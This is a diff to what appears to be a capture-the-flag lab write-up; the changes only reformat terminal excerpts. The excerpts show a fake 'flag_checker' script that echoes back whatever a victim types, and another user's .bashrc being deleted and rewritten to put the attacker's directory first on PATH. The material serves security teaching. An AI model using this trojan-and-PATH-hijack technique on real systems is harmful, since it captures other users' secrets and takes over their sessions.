@@ -51,13 +51,15 @@ HINT: Don't forget to make your fake flag_checker executable, like you learned i
 
 ```bash
 hacker@shenanigans~sniffing-input:~$ nano /home/hacker/flag_checker
-  GNU nano 8.4                                          /home/hacker/flag_checker                                                       #!/bin/bash
+  GNU nano 8.4                                          /home/hacker/flag_checker
+  #!/bin/bash
 
   echo "Type the flag"
   cat
 hacker@shenanigans~sniffing-input:~$ chmod +x /home/hacker/flag_checker
 hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
-  GNU nano 8.4                                            /home/zardus/.bashrc                                                           # this sets up a scary red shell prompt!
+  GNU nano 8.4                                            /home/zardus/.bashrc
+  # this sets up a scary red shell prompt!
   PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '
 
   # add your attack below this line!
@@ -112,7 +114,8 @@ As you know, there are lots of sensitive files in that directory such as .bashrc
 
 ```bash
 hacker@shenanigans~overshared-directories:~$ nano /home/hacker/flag_checker
-  GNU nano 8.4                                          /home/hacker/flag_checker                                                       #!/bin/bash
+  GNU nano 8.4                                          /home/hacker/flag_checker
+  #!/bin/bash
 
   echo "Type the flag"
   cat
@@ -120,7 +123,8 @@ hacker@shenanigans~overshared-directories:~$ chmod +x /home/hacker/flag_checker
 hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
 rm: remove write-protected regular file '/home/zardus/.bashrc'? y
 hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
-  GNU nano 8.4                                            /home/zardus/.bashrc                                                          #!/bin/bash
+  GNU nano 8.4                                            /home/zardus/.bashrc
+  #!/bin/bash
 
   export PATH="/home/hacker:$PATH"
 hacker@shenanigans~overshared-directories:~$ /challenge/victim
@@ -275,4 +279,5 @@ I ran nano /home/zardus/.bashrc to go through zardus' startup script, which was 
 
 ### New Learnings
 The risk of world-readable config files.
+
 
